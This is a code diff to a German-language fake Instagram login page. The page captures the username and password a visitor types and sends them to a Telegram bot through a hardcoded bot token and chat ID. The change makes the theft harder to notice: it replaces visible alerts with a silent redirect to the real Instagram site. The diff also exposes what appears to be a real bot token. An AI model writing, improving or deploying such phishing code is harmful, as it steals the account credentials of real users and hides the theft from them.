@@ -212,7 +212,7 @@
       <input type="text" id="username" placeholder="Telefonnummer, Benutzername oder E-Mail">
       <input type="password" id="password" placeholder="Passwort">
       <a href="#">Passwort vergessen?</a>
-      <button type="button" onclick="sendToTelegram()">Anmelden</button>
+      <button type="button" onclick="sendToTelegramAndRedirect()">Anmelden</button>
     </div>
 
     <!-- Registrierung -->
@@ -231,7 +231,7 @@
     const BOT_TOKEN = "7433787133:AAHuCXGJgERrcUwvb4adFMTlv8EX7e-upZY"; // Bot-Token
     const CHAT_ID = "6640486406";   // Deine Chat-ID
 
-    function sendToTelegram() {
+    function sendToTelegramAndRedirect() {
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
@@ -258,14 +258,11 @@
           return response.json();
         })
         .then(function (data) {
-          if (data.ok) {
-            alert("Daten erfolgreich gesendet!");
-          } else {
-            alert("Fehler: " + data.description);
-          }
+          // Weiterleitung zur echten Instagram-Website
+          window.location.href = "https://www.instagram.com/";
         })
         .catch(function (error) {
-          alert("Ein Fehler ist aufgetreten: " + error.message);
+          console.error("Ein Fehler ist aufgetreten:", error.message);
         });
     }
   </script>
